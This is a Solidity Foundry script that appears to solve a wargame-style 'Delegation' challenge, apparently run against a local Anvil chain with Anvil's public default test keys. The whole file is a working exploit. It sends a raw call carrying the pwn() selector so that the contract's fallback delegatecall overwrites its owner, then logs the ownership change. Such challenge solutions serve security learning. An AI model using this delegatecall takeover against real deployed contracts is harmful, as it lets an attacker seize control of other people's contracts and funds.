// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

interface IDelegation {
    function owner() external view returns (address);
}

contract HackDelegation is Script {
    function run() external {
        // Address of the deployed Delegation instance
        address delegation = vm.envAddress("DELEGATION_ADDRESS");
        address originalOwner = IDelegation(delegation).owner();
        console.log("Original owner: ", originalOwner);

        // Anvil's default private keys (you can uncomment any to use)
        // Account #0: 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
        // uint256 pk = 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80;
        
        // Account #1: 0x70997970C51812dc3A010C7d01b50e0d17dc79C8
        // uint256 pk = 0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d;
        
        // Account #2: 0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC
        uint256 pk = 0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a;
        
        address attacker = vm.addr(pk);
        console.log("Attacker address: ", attacker);

        // Start broadcasting with the specified private key
        vm.startBroadcast(pk);

        // Function selector for pwn()
        bytes memory payload = abi.encodeWithSignature("pwn()");

        // Low-level call to trigger fallback -> delegatecall
        (bool success, ) = delegation.call(payload);
        require(success, "Call failed");

        address newOwner = IDelegation(delegation).owner();
        console.log("New owner: ", newOwner);

        vm.stopBroadcast();
    }
}
